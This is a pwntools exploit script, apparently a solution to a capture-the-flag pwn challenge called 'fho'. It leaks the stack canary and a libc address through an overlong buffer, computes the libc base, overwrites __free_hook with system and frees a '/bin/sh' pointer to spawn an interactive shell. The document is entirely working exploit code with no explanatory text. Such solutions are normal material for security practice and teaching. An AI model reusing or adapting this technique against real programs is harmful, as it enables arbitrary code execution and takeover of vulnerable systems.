#!/bin/python3
from pwn import *
exe = ELF('./fho_patched')
libc = ELF('./libc.so.6')
p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
b*main+153
           c

           ''')
#################exploiting#####################
payload = b'a'*57
p.sendafter(b'Buf: ', payload)
p.recvuntil(b'a'*57)
canary_leak = u64(b'\x00' + p.recv(7))
libc_csu_init = u64(p.recv(6) + b'\x00\x00')                  
libc.address = libc_csu_init -4196928
libc_free_hook = libc.address + 0x3ed8e8 
libc_bin_sh = libc.address + 1785370
libc_system = libc.address + 324944 
###########log info#############################
log.info("libc_free_hook: " + hex(libc_free_hook))
log.info("libc.address: " + hex(libc.address))
log.info("libc_bin_sh: " + hex(libc_bin_sh))
log.info("libc_system: " + hex(libc_system))

######################################################
##send data to binary 
#
p.sendlineafter(b'To write: ', str(libc_free_hook))
p.sendlineafter(b'With: ',str(libc_system))
# p.recvuntil(b'[')
# stack_leak = int(p.recvuntil(b']',drop=True),16)
# log.info("stack_leak: " + hex(stack_leak))
p.sendlineafter(b'To free: ', str(libc_bin_sh))

# p.recvuntil("To write: ")
# p.sendline(str(libc_free_hook))
# p.recvuntil("With: ")
# p.sendline(str(libc_system))
#
# p.recvuntil("To free: ")
# p.sendline(str(libc_bin_sh))

##############the end###########################
p.interactive()
